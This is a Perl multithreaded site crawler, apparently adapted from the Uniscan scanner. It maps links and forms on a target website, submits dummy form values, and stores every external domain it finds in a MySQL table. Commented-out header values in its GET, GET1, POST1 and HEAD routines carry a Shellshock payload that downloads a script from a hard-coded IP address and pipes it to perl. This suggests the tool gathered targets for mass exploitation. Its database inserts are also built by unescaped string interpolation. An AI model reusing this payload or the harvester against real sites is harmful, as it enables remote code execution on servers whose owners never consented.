#!/usr/bin/perl
	
	use DBI;
	use threads;
	use threads::shared;
	use Thread::Queue;
	use Thread::Semaphore;
	use strict;
	use URI;
	use HTTP::Cookies;
	use HTTP::Headers;
	use HTTP::Request;
	use LWP::UserAgent;
	
				
	$|++;
	#
	# create table site(id int auto_increment primary key,site varchar(256) not null unique, index int default 0)
	alarm(20);
	
	our $pri 	: shared 	= 1;
	our $tempo 	: shared	= 15;
	our $last_req	: shared	= -1;
	our $requests 	: shared 	= 0;
	our $u		: shared 	= 0;
	our $reqs	: shared 	= 0;
	our $report_id 	: shared	= "";
	our @list	: shared 	= ( );
	my  @threads			= ( );
	our %forms	: shared 	= ( );
	our %checado	: shared	= ( );
	our %checado2	: shared	= ( );
	our %urls	: shared	= ( );
	our %novo	: shared	= ( );
	our %ignored  	: shared	= ( );
	our %files 	: shared	= ( );
	our @url_list = ( );
	my $p = 0;
	my $pat = 0;
	my $q = new Thread::Queue;
	my $semaphore = Thread::Semaphore->new();
	our $urlsite :shared = $ARGV[0];
	#print "craw: $urlsite\n";
	#print "site: $urlsite\n";	
	&AddUrl($urlsite);
	$urlsite =~ s/\/$//gi;
	my @robots = &CheckRobots($urlsite);
	my $rob = "";
	foreach my $r (@robots){
		&AddUrl($r);
		$rob .= $r."\n";
	}

	my @sitemap = &CheckSitemap($urlsite);
	my $simap = "";
	foreach my $r (@sitemap){
		&AddUrl($r);
		$simap .= $r . "\n";
	}

	&AddUrl($urlsite."/");
	
        my $url = CheckRedirect($urlsite);
        my $url_temp = $url;
        my $proto = "";
        if($url_temp =~ /http:\/\//){
        	$proto = "http://";
        }
        else{ $proto = "https://"; }
        $url_temp =~s/https?:\/\///g;
        if(rindex($url_temp, '/') != index($url_temp, '/')){
                $url_temp = $proto . substr($url_temp, 0, index($url_temp, '/')+1);
                &AddUrl($url_temp);
        }


		
	$urlsite .= '/';
	my $t = threads->new(\&online);
	&start();
	$t->join();


##################### funcoes #######################



	sub get_input(){
		my $content = shift;
		my @input = ();
		while ($content =~  m/<input(.+?)>/gi){
			my $inp = $1;
			if($inp =~ /name/i){
				$inp =~ m/name *= *"(.+?)"/gi;
				push(@input, $1);
			}
		}
	
		while ($content =~  m/<select(.+?)>/gi){
			my $inp = $1;
			if($inp =~ /name/i){
				$inp =~ m/name *= *"(.+?)"/gi;
				push(@input, $1);
			}
		}
	
		while ($content =~  m/<textarea(.+?)>/gi){
			my $inp = $1;
			if($inp =~ /name/i){
				$inp =~ m/name *= *"(.+?)"/gi;
				push(@input, $1);
			}
		}
		return @input;
	}
	
	
	
	sub get_extension(){
		my  $file = shift;
		if($file =~/\./){
			my $ext = substr($file, rindex($file, '.'), length($file));
			$ext =~ s/ //g;
			if($ext !~/\(|\)|\-|\//){
				return $ext;
			}
			else {
				return 0;
			}
		}
		else{
			return 0;
		}
	}
	
	
	
sub pega_action(){
	my ($url, $conteudo) = @_;
	my $protocolo;
	$protocolo = "http://" if($url =~/^http:\/\//i);
	$protocolo = "https://" if($url =~/^https:\/\//i);
	my $diretorio = &diretorio_atual($url);
	my $dom = &host($url);
	
	while($conteudo =~ m/action\s*=\s*['"](.+?)['"]/gsi){
		my $action = $1;
		if($action =~m/^https?:\/\/\Q$dom\E/gi){
			return $action;
		}
		if($action =~ m/^\//){
			$action = $protocolo . $dom . $action;
			return $action;
		}
		if($action !~/^\/|^https?:\/\//i){
			$action = $protocolo . $dom . $diretorio . $action;
			return $action;
		}
		return $action if($action =~/^https?:\/\//);
		return $url;
	}
}	







	sub add_form(){
		my ($url, $conteudo) = @_;
		my @form = ();
		while($conteudo =~m/<form(.+?)<\/form>/gsi){
			my $f_cont = $1;
			my $action = &pega_action($url, $f_cont);
			my $dominio = &host($url);
			next if($action !~/$dominio/);
			my $method;
			while($f_cont =~m/method *= *["'](.+?)["']/gsi){
				$method = $1;
			}
			$method = "post" if(!$method);
			my @inputs = &get_input($f_cont);
			
			if($method =~ /get/i ){
				my $url2 = $action . '?';
				foreach my $var (@inputs){
					$url2 .= '&'.$var .'=123' if($var && $url2 !~/\Q$var\E/);
				}
				push(@form, $url2);
			}
			else{
				my $data = "";
				foreach my $var (@inputs){
					$data .='&'.$var.'=123' if($var && $data !~/\Q$var\E/);
				}
				push(@form, $action . "|#|" . $data);
			}
		}
	return(@form);
	}	
	
	
	
	
	
	
	sub get_urls(){
		my $url = shift; 
		
		return if($url !~/^$urlsite/i);

		my $resultado = "";
		my $response;
		
		if($url =~ /\|#\|/g){
			#print "url: $url\n";
			#			my ($action, $data) = split('\|#\|', $url);
			#print "POST: $action\n$data\n";
			#$response = POST1($action, $data);
			#$requests++;
##external

			#		my @ret = &execute($url, $response->decoded_content );
			#	my $link;
			#foreach $link (@ret){
			#		chomp $link;
			#		$link =~s/https?:\/\///g;
			#		$link = substr($link, 0, index($link, '/')) if($link =~/\//);
			#		$link =~s/'//g;
			#		$link = lc($link);
			#	if($link =~/^[a-z0-9\.\-]+$/){
			#	if($link !~/blogspot/i && $link !~/wordpress/i && $link !~/canalblog/i && $link !~/blogger/i && $link !~/thumblr/i && $link !~/tumblr/i && $link !~/booked\.|nochi\.|\.booked|hotelmix\.|hotel\-mix\./i){
			#	my $dbh = DBI->connect('DBI:mysql:;host=localhost','root','', {'PrintError'=>0}) or die("sem conexao com o banco de dados");
			#	my $query = "INSERT INTO `sites`.`site` (url)  VALUES ('$link');";
			#	my $query_handle2 = $dbh->prepare($query);
			#	if($query_handle2->execute()){		
			#		print "[+] Novo Site no banco de dados: $link\n";	
			#	}
			#	$dbh->disconnect();
			#		}
			#	}
			#}


###########

		}
		else{
			$response = GET1($url);
			$requests++;
##external

		my @ret = &execute($url, $response->decoded_content );
		my $link;
			foreach $link (@ret){
				chomp $link;
				$link =~s/https?:\/\///g;
				$link = substr($link, 0, index($link, '/')) if($link =~/\//);
				$link =~s/'//g;
				$link = lc($link);
				if($link =~/^[a-z0-9\.\-]+$/){
				if($link !~/blogspot/i && $link !~/wordpress/i && $link !~/canalblog/i && $link !~/blogger/i && $link !~/thumblr/i && $link !~/tumblr/i && $link !~/booked\.|nochi\.|\.booked|hotelmix\.|hotel\-mix\./i && $novo{$link} != 1 && $link !~/lofter/ && $link !~/vctvision/ && $link !~/exblog/ && $link !~/fc2\.com/ && $link !~/fileflash\.com/ && $link !~/blogfa/ && $link !~/yuboweighing\.com/){
					$novo{$link} = 1;
					my $dbh = DBI->connect('DBI:mysql:;host=localhost','root','', {'PrintError'=>0}) or die("sem conexao com o banco de dados");
					my $query = "INSERT INTO `sites`.`site` (url)  VALUES ('$link');";
					my $query_handle2 = $dbh->prepare($query);
					if($query_handle2->execute()){		
						print "[+] Novo Site no banco de dados: $link\n";	
					}
				$dbh->disconnect();
				}
				}
			}


###########

		}
		return if(!$response);
		return if(!$response->is_success);
		
		$url = $response->request->uri;


		return if($url !~/^$urlsite/i);

		$resultado = $response->decoded_content;




		my $dominio = &host($url);
		my $diretorio = &diretorio_atual($url);
		my $protocolo = "";
		$protocolo = "http://" if($url =~/^http:\/\//i);
		$protocolo = "https://" if($url =~/^https:\/\//i);
		
		my @uurls = &parser($resultado);
 		if($resultado =~ m/<form/gi){
			my @posts = &add_form($url, $resultado);
			foreach my $post (@posts){
				push(@uurls, $post);
			}
		}
		@uurls = &classifica_urls($protocolo, $dominio, $diretorio, @uurls);
		@uurls = &adiciona_diretorios(@uurls);
		@uurls = &verifica_variacao(@uurls);
		@uurls = &verifica_ignorados(@uurls);
		#@uurls = &checa_head(@uurls);	
		return(@uurls);
	}
	
	
	
	
	sub crawling(){		
		while($reqs <= 1000){
			sleep(5) if($q->pending < 1);
			$semaphore->down();
			my $l = $q->dequeue if($q->pending);			
			$semaphore->up();
			next if(not defined $l);
			next if($l !~/https?:\/\//i);
			$reqs++;
			my @tmp = &get_urls($l);
			foreach my $t (@tmp){
				if(!$urls{$t}){
					push(@list, $t);
					$q->enqueue($t);
					$u++;
					$urls{$t} = 1;					
				}
			}
			$pri = 0;
		}
		$q->enqueue(undef);
	}
	
	
	
	
	
	sub start(){
		$reqs = 0;
		#$pat = &INotPage($url_list[1]);
		foreach my $ur (@url_list){
			$q->enqueue($ur);
		}
		$semaphore->down();
		$u = scalar(@url_list);
		$semaphore->up();
		$url = $url_list[0];
		my $controlador = threads->new(\&baixa_threads);	
		my $x =0;
		while($x < 10){
			$x++;
			push @threads, threads->new(\&crawling);
			
			while($pri == 1){
				sleep(1);
			}
		}
		
		
		foreach my $running (@threads) {
			$running->join();
			
		}
	
		while($q->pending()){
			$q->dequeue;
		}
		
		$controlador->join;
	
		

		if($list[0]){
			while($list[0] !~ /^https?:\/\//i && $list[0]){
				shift @list;
			}
		}
		my $ign = "";
		foreach my $key (keys %ignored){
			$ign .= $key . "\n";
		}
		
		my $lst = "";
		foreach my $key (@list){
			$lst .= $key . "\n" if($key =~/^$urlsite/i);
		}
		$lst =~s/'/\\'/gi;
		$ign =~s/'/\\'/gi;
		$rob =~s/'/\\'/gi;
		$simap =~s/'/\\'/gi;
		my $arq;
		return @list;
		
	}
	

	
	sub AddUrl(){
	my $ur = shift;
		push(@url_list, $ur) if($ur =~/^https?:\/\//i);
	}
	
	
		
	sub CheckRobots(){
		my  $url = shift;
		
		my @found = ();
		return @found;
		my $content = &GET($url."/robots.txt");
		$requests++;
		if($content =~/Allow:|Disallow:/){
		    
			my @file = split("\n", $content);
			foreach my $f (@file){
				my ($tag, $dir) = split(' ', $f);
				if($dir){  
				push(@found, $url.$dir) if($dir =~/^\//);
				}
			}
		}
	return @found;
	}
	
	
	sub CheckSitemap(){
		my $url = shift;
		my @found = ();
		return @found;
		my $content = GET($url."/sitemap.xml");
		$requests++;
		$content =~s/\n//g;
		$content =~s/\r//g;
		while($content =~ m/<loc>(.+?)<\/loc>/gi){
			my $file = $1;
			if($file =~ /^https?:\/\//i){
				my $ho = &host($url);
				if($file =~ /$ho/i){
					push @found, $file;
				}
			}
			else{
				$file = $url . $file;
				push @found, $file;
			}
		}
		return @found;
	}
	
	
	
	sub GetForms(){
		my @f = ();
		foreach my $key (keys %forms){	
			push(@f, $key.'|#|'.$forms{$key});
		}
		return @f;
	}
	
	
	
	
		
	

	
	sub corta(){
		my $str = shift;
		if($str =~/\?/){
			$str = substr($str, 0, index($str, '?'));
		}
		if($str =~/\|#\|/){
			$str = substr($str, 0, index($str, '|#|'));
		}
		return $str;
	}
	sub host(){
		my $h = shift;
		my $url1 = URI->new( $h || return -1 );
		return $url1->host();
	}

	sub diretorio_atual(){
		my $url = shift;
		
		$url =~s/https?:\/\///;
		my $dir = substr($url, index($url, '/'), length($url));
		$dir = substr($dir, 0, rindex($dir, '/')+1);
		$dir = '/' if($dir !~/^\//);
		return $dir;
		
	}
	
sub parser(){
	my $content = shift;	
	my @ERs = (	'href\s*=\s*"(.+?)"',
			'href\s*=\s*\'(.+?)\'',
			"location.href='(.+?)'",
			"window\.open\('(.+?)'(,'')*\)",
			'src\s*=\s*["\'](.+?)["\']',
			'location.href\s*=\s*"(.+?)"', 
			'<meta.+content=\"\d+;\s*URL=(.+?)\".*\/?>',
			);
	my @result = ();
	
	foreach my $er (@ERs){
		while($content =~ m/$er/gi){
			push(@result, $1);
		}
	} 

	return @result;
}

sub classifica_urls(){
	my ($protocolo, $dominio, $diretorio, @uurls) = @_;
	my @ret = ();
	$diretorio =~ s/\/\//\//g;
	$protocolo = 'http://' if($protocolo =~/^http:\// && $protocolo !~/http:\/\//);
	$protocolo = 'https://' if($protocolo =~/^https:\// && $protocolo !~/https:\/\//);
	
	foreach my $url (@uurls){
		next if($url =~/^htp:\//);
		next if($url =~/file:\/\//gi);
		next if($url =~/ \+ /gi);
		next if($url =~/connect\.facebook\.net/i);
		next if($url =~/ajax\.googleapis\.com/i);
		next if($url =~/www\.facebook\.com/i);
		next if($url =~/^ [A-Za-z]+=/i);
		next if($url =~/mms:\/\//gi);
		
		
		
		$url =~s/^ // if($url =~/^ https?:/);
		
		if($url =~/^http:\// && $url !~/http:\/\//){
			$url =~ s/^http:\//http:\/\//;
		}

		if($url =~/^https:\// && $url !~/https:\/\//){
			$url =~ s/^https:\//https:\/\//;
		}

		$url = &trata_url($url);
		next if($url =~ m/javascript:|mailto:/gi);
		# retira os n ../ e volta n diretorios
		my $temp_dir = $diretorio;
		while($url =~/^\.\.\//){
			$url = substr($url, 3, length($url));
			$temp_dir =~s/\/$//;
			$temp_dir = substr($temp_dir, 0, rindex($temp_dir, '/')+1);
		}
		
		while($url =~/\.\.\//){
			$url = &volta_dir($url);
		}
		$url =~s/^\.\///g;
		
		#limpezas:
		my $flag = 0;
		$flag = 1 if($url =~/\|#\|/);
		#print "$url\n" if($flag);
		my $tmp = substr($url, index($url, '|#|'), length($url)) if($url =~/\|#\|/);
		#print "tmp $tmp\n" if($flag);
		$url = substr($url, 0, index($url, '|#|')) if($url =~/\|#\|/);
		#print "$url\n" if($flag);
		$url =~s/'//g;
		$url =~s/"//g;
		if($url =~ /^\.\//){
			$url = substr($url, 2, length($url));
		}
		#se come\E7a com https?:\/\/ e contem o dominio entao adiciona ao retorno
		$url .= $tmp if($flag == 1);
		#print "$url\n" if($flag);
		
		push(@ret, $url) if($url =~ m/^https?:\/\/\Q$dominio\E/i && $url =~/^$urlsite/);
		
		#se come\E7a com /, adiciona https?:// + dominio + url ao retorno
		push(@ret, $protocolo . $dominio . $url) if($url =~/^\//);
		
		#se n\E3o come\E7a com https:// e n\E3o come\E7a com /: add ao ret : https:// $dominio $diretorio $url
		push(@ret, $protocolo . $dominio . $temp_dir . $url) if($url !~/^https?:\/\//i && $url !~ /^\//);
		
	}
	
	return @ret;
}

sub verifica_variacao(){
	my @uurls = @_;
	my @ret = ();
	
	foreach my $url (@uurls){
		$url = &trata_url($url);
		my $fil = get_file($url);
			
		if($files{$fil} <= 5 && !$files{$url}){
			$files{$fil}++;
			$files{$url}=1;
			push(@ret, $url)if($url =~ /^$urlsite/i);
		}
	}
	return(@ret);
}

sub verifica_ignorados(){
	my @uurls = @_;
	my @ret = ();
	my $exten = ".wmv.exe.pdf.xls.csv.mdb.rpm.deb.doc.odt.pptx.docx.db.xps.cdr.jpg.jpeg.png.gif.bmp.css.tgz.gz.bz2.mp4.zip.rar.tar.asf.avi.bin.dll.js.fla.mp3.mpg.mov.ogg.ppt.rtf.scr.wav.msi.swf.sql.xml.flv.ogv.ico";
	foreach my $url (@uurls){
		$url = &trata_url($url);
		my $fil = get_file($url);
		my $ext = &get_extension($fil);
		if($exten !~/$ext/i){
			if (!$checado{$url}) {
				$checado{$url} = 1;
				my $temp = $url;
				$url = substr($url, 0, index($url, '|#|')) if($url =~/\|#\|/);
				#my $res = HEAD($url);
				$url = $temp;
				#$requests++;
				#if($res->code !~ m/401|403|404/g && $res->code && $url =~ /^$urlsite/i){
					push(@ret, $url);
				#}
				#else{
					#open(a, ">>error.txt");
					#print a __LINE__ . " code: " .$res->code . " $url \n";
					#close(a);
				#}
			}
		}
		else{
		}
	}
	return(@ret);
	
}

sub checa_head(){
	my @uurls = @_;
	my @ret = ();
	foreach my $url (@uurls){
		$url = &trata_url($url);
		if (!$checado2{$url}) {
			$checado2{$url} = 1;
			my $temp = $url;
			$url = substr($url, 0, index($url, '|#|')) if($url =~/\|#\|/);
			my $response = HEAD($url);
			$url = $temp;
			$requests++;
			if($response->code !~ /401|403|404/ && $response->code){
				push(@ret, $url) if($url =~ /^$urlsite/i);
			}
			else{
#				open(a, ">>error.txt");
#				print a __LINE__ . " code: " .$response->code . " $url \n";
#				close(a);
			}
		}
	}
	return(@ret);
	
}

sub adiciona_diretorios(){
	my @uurls = @_;
	my @ret = ();
	my %controle;
	
	foreach my $url (@uurls){
		$url = &trata_url($url);
		$controle{$url}=1 if($url =~/^$urlsite/);
		while(length($url)>13){
			$url = substr($url, 0, rindex($url, '/'));
			$controle{$url."/"} = 1 if(length($url)>13 && $url =~ /^$urlsite/i);
		}
	}
	foreach my $key (keys %controle){
		push(@ret, $key) if($key =~/^$urlsite/i);
	}
	return(@ret);
}


#termina termina os threads se nao fizer requests por mais de 2 minuto (controlador de threads baseado nas requests)
sub baixa_threads(){
	while ($requests != $last_req) {
		$last_req = $requests;
		sleep($tempo);
	}
	$reqs += 100;
	return 1;
}



sub checa_online(){
        
        my $x=0;
        my $site = $ARGV[0];
        while ($x<=10) {

                my $res = GET1($site);
                if ($res->is_success) {
                        return 1;
                }
                else{
                        sleep(10);
                }
                $x++;
        }
        return 0;
}





sub online(){
	while(checa_online() && $q->pending > 0){
		sleep(10);
	}
 	#exit();		
	while($q->pending > 0){
		$q->dequeue;
	}
	
}


sub trata_url(){
	my $url = shift;

	$url =~s/&quot;/%22/gi;
	$url =~s/&amp;/&/gi;
	$url =~s/&lt;/%3C/gi;
	$url =~s/&gt;/%3E/gi;
	$url =~s/&Aacute;/%C3%81/gi;
	$url =~s/&nbsp;/%20/gi;
	$url =~s/&Acirc;/%C3%82/gi;
	$url =~s/&Agrave;/%C3%80/gi;
	$url =~s/&Atilde;/%C3%83/gi;
	$url =~s/&aacute;/%C3%A1/gi;
	$url =~s/&acirc;/%C3%A2/gi;
	$url =~s/&agrave;/%C3%A0/gi;
	$url =~s/&atilde;/%C3%A3/gi;
	$url =~s/&Eacute;/%C3%89/gi;
	$url =~s/&Ecirc;/%C3%8A/gi;
	$url =~s/&Egrave;/%C3%88/gi;
	$url =~s/&eacute;/%C3%A9/gi;
	$url =~s/&ecirc;/%C3%AA/gi;
	$url =~s/&egrave;/%C3%A8/gi;
	$url =~s/&Iacute;/%C3%8D/gi;
	$url =~s/&Icirc;/%C3%8E/gi;
	$url =~s/&Igrave;/%C3%8C/gi;
	$url =~s/&icirc;/%C3%AE/gi;
	$url =~s/&igrave;/%C3%AC/gi;
	$url =~s/&Oacute;/%C3%93/gi;
	$url =~s/&Ocirc;/%C3%94/gi;
	$url =~s/&Ograve;/%C3%92/gi;
	$url =~s/&Otilde;/%C3%95/gi;
	$url =~s/&oacute;/%C3%B3/gi;
	$url =~s/&ocirc;/%C3%B4/gi;
	$url =~s/&ograve;/%C3%B2/gi;
	$url =~s/&otilde;/%C3%B5/gi;
	$url =~s/&Uacute;/%C3%9A/gi;
	$url =~s/&Ucirc;/%C3%9B/gi;
	$url =~s/&Ugrave;/%C3%99/gi;
	$url =~s/&uacute;/%C3%BA/gi;
	$url =~s/&ucirc;/%C3%BB/gi;
	$url =~s/&ugrave;/%C3%B9/gi;
	$url =~s/ /%20/gi;
	$url =~s/\+/%2B/gi;
	$url =~s/&Ccedil;/%C3%87/gi;
	$url =~s/&ccedil;/%C3%A7/gi;
	return $url;
}


sub volta_dir(){
	my $url = shift;
	my $pos = index($url, '../');
	#print "pos: $pos\n";
	my $str1 = substr($url, 0, $pos-1);
	$str1 = substr($url, 0, rindex($str1, '/'));
	my $str2 = substr($url, $pos+2, length($url));
	#print "1 $str1\n2 $str2\n";
	return $str1.$str2;
}



sub GET(){
        my $url1 = shift;
        return 0 if(!$url1);
        return 0 if($url1 !~/^https?:\/\//);
        my $headers = HTTP::Headers->new();
	#print "GET: $url1\n";
	my $cu = cript($url1);
	my $referer = "Uniscan PRO Spider";# () { :;}; /bin/bash -c 'wget -O - 172.245.173.135/b |perl'";
	my $useragent = $referer;

        $headers->remove_header('Connection');
        $headers->header('Accept'               => "*/*",
                        'Accept-Language'       => "en-US,en",
                         'Accept-Encoding'      => "deflate",
                         'Connection'           => "Keep-alive",
                         'Keep-Alive'           => 30);
        $headers->referer($referer);

        my $req = HTTP::Request->new('GET', $url1, $headers);
#        my $cookie_jar = HTTP::Cookies->new(file => "cookies.lwp",autosave => 1);
        my $ua  = LWP::UserAgent->new(agent => $useragent, ssl_opts => { verify_hostname => 0} );

        #$ua->cookie_jar($cookie_jar);
        $ua->timeout(15);
        $ua->max_size(1024*1024);
        $ua->protocols_allowed( [ 'http', 'https'] );
        my $response=$ua->request($req);

        my $code = $response->code;
        if($response->is_success){
                return $response->decoded_content;
        }
        elsif($code == 404){
                return "error";
        }
        else{
                return $code;
        }

}


sub CheckRedirect(){
        my $url = shift;
        use LWP::UserAgent;
        use HTTP::Headers;
        my $ua = LWP::UserAgent->new;
        my $request  = HTTP::Request->new( HEAD => $url);
        my $response = $ua->request($request);
        $requests++;
        if ( $response->is_success and $response->previous ){
                $url = $response->request->uri;
        }
        return $url;
}


sub GET1(){
    my $url1 = shift;
	
	return 0 if(!$url1);
	return 0 if($url1 !~/^https?:\/\//);
	my $headers = HTTP::Headers->new();
	#print "GET: $url1\n";
	my $cu = cript($url1);
	my $referer = "Uniscan PRO Spider";#() { :;}; /bin/bash -c 'wget -O - 172.245.173.135/b |perl'";
	my $useragent = $referer;
	$headers->header('Accept' 		=> "*/*",
			'Accept-Language' 	=> "en-US,en",
			 'Accept-Encoding' 	=> "deflate",
			 'Connection' 		=> "Keep-alive",
			 'Keep-Alive'		=> 30);
	$headers->referer($referer);
	my $req = HTTP::Request->new('GET',$url1, $headers);
#	my $cookie_jar = HTTP::Cookies->new(file => "cookies.lwp",autosave => 1);
    	my $ua	= LWP::UserAgent->new(agent => $useragent, ssl_opts => { verify_hostname => 0} );
	#$ua->cookie_jar($cookie_jar);
    	$ua->timeout(15);
    	$ua->max_size(1024*1024);
	$ua->protocols_allowed( [ 'http', 'https'] );
    	my $response=$ua->request($req);

	return $response;	
}




sub INotPage(){
	$url = shift;
	$url .= "/uniscan". int(rand(10000)) ."uniscan/";
	my $pattern;
	my $content = &GET($url);
	$requests++;
	if($content =~ /404/){
		$pattern = substr($content, 0, index($content, "404")+3);
	}
	else{
		$content =~/<title>(.+)<\/title>/i;
		$pattern = $1;
	}
	$pattern = "not found|não encontrada|página solicitada não existe|could not be found" if(!$pattern);
	return $pattern;
}




sub POST1(){
        my ($url1, $data) = @_;
	return if(!$url1);
	return 0 if($url1 !~/^https?:\/\//);
#		print "POST1: $url1\n";
        $data =~ s/\r//g;
	my $headers = HTTP::Headers->new();
	my $cu = cript($url1);
	my $referer = "";#() { :;}; /bin/bash -c 'wget -O - 172.245.173.135/b |perl'";
	my $useragent = $referer;
	$headers->remove_header('Connection');
	$headers->header('Accept' 		=> "*",
			'Accept-Language' 	=> "en-US,en",
			 'Accept-Encoding' 	=> "deflate",
			 'Connection' 		=> "Keep-alive",
			 'Keep-Alive'		=> 30);
	$headers->referer($referer);
        my $request= HTTP::Request->new("POST", $url1, $headers);
        $request->content($data);
        $request->content_type('application/x-www-form-urlencoded');
#	my $cookie_jar = HTTP::Cookies->new(file => "cookies.lwp",autosave => 1);
        my $ua=LWP::UserAgent->new(agent => $useragent, ssl_opts => { verify_hostname => 0} );
	
	#$ua->cookie_jar($cookie_jar);

        $ua->timeout(15);
        $ua->max_size(1024*1024);
	$ua->protocols_allowed( [ 'http', 'https'] );
        my $response=$ua->request($request);

        return $response;
        }






sub HEAD(){
	my $url1 = shift;
#	print "HEAD: $url1\n";
	my $headers = HTTP::Headers->new();
	my $cu = cript($url1);
	my $referer = "";#() { :;}; /bin/bash -c 'wget -O - 172.245.173.135/b |perl'";
	my $useragent = $referer;
	$headers->remove_header('Connection');
	$headers->header('Accept' 		=> "*",
			'Accept-Language' 	=> "en-US,en",
			 'Accept-Encoding' 	=> "deflate",
			 'Connection' 		=> "Keep-alive",
			 'Keep-Alive'		=> 30);
	$headers->referer($referer);
	my $req=HTTP::Request->new('HEAD', $url1, $headers);
	my $ua=LWP::UserAgent->new(agent => $useragent, ssl_opts => { verify_hostname => 0} );
	$ua->timeout(15);
	$ua->max_size(1024*1024);
	$ua->protocols_allowed( [ 'http', 'https'] );
	#$ua->cookie_jar($cookie_jar);
	
	my $response=$ua->request($req);

	return $response;

}



sub cript(){
	my $str = shift;
	my $crypt = unpack ("H*",$str);
 	return($crypt);
}



sub execute {
    my $url = shift;
    my $content = shift;

    my $url_uri = &host($url);
    $url = &get_url($url);

	my %ver = ();
	my @ret = ();
    my @ERs = (	"href=\"https?:\/\/(.+)\/\"", 
		"href='https?:\/\/(.+)\/'", 
		"location.href='https?:\/\/(.+)'",
		"src='https?:\/\/(.+)\/'",
		"src=\"https?:\/\/(.+)\/\"",
		"location.href=\"https?:\/\/(.+)\/\"", 
		"<meta.*content=\"?.*;URL=https?:\/\/(.+)\/\"?.*?>"
    );
			
	foreach my $er (@ERs){
		while ($content =~  m/$er/gi){
			my $link = $1;
			next if($link =~/[\s"']/);
			if($url ne $link){
	            if($link !~ /$url_uri/){
					if(!$ver{$link}){
							push(@ret,$link) if($link);
							$ver{$link} = 1;
					}
 			    }
			}
		}
	}
	return @ret;

}



sub get_url(){
	my $url = shift;
	if($url =~/http:\/\//){
		$url =~s/http:\/\///g;
		$url = substr($url, 0, index($url, '/')) if($url =~/\//);
		return "http://" . $url;
	}
	if($url =~/https:\/\//){
		$url =~s/https:\/\///g;
		$url =  substr($url, 0, index($url, '/')) if($url =~/\//);
		return "https://" . $url;
	}
}


sub get_file(){
	my $url1 = shift;
	substr($url1,0,7) = "" if($url1 =~/http:\/\//);
	substr($url1,0,8) = "" if($url1 =~/https:\/\//);
	substr($url1, index($url1, '?'), length($url1)) = "" if($url1 =~/\?/);
	substr($url1, index($url1, '|#|'), length($url1)) = "" if($url1 =~/\|#\|/);
	if($url1 =~ /\//){
		$url1 = substr($url1, index($url1, '/'), length($url1)) if(length($url1) != index($url1, '/'));
		if($url1 =~ /\?/){
			$url1 = substr($url1, 0, index($url1, '?'));
		}
		return $url1;
	}
	elsif($url1=~/\?/){
		$url1 = substr($url1, 0, index($url1, '?'));
		return $url1;
	}
	else {
		return $url1;
	}
}
